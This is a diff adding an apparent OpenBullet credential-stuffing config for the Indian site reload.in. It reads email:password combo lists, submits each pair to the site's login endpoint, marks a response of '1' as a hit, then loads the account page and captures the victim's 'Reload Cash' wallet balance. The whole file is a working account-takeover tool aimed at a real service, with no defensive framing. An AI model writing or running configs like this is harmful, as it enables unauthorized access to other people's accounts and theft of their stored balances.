@@ -1,0 +1,52 @@
+[SETTINGS]
+{
+  "Name": "Reload.in",
+  "SuggestedBots": 1,
+  "LastModified": "2019-07-04T17:44:16.4270522+05:30",
+  "AdditionalInfo": "",
+  "Author": "@khushal13",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.reload.in/login/signin/" 
+  CONTENT "loginemail=<USER>&loginpassword=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.reload.in" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: https://www.reload.in" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Referer: https://www.reload.in/login/" 
+  HEADER "Accept-Language: en-IN,en;q=0.9,mr-IN;q=0.8,mr;q=0.7,en-GB;q=0.6,en-US;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "1" 
+  KEYCHAIN Failure OR 
+    KEY "10" 
+REQUEST GET "https://www.reload.in/myaccount/reloadCash/" 
+  CONTENT "\"head-reloadcash\"" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+PARSE "<SOURCE>" LR "Available Reload Cash : " "</span></div><br/>" -> CAP "Wallet" 
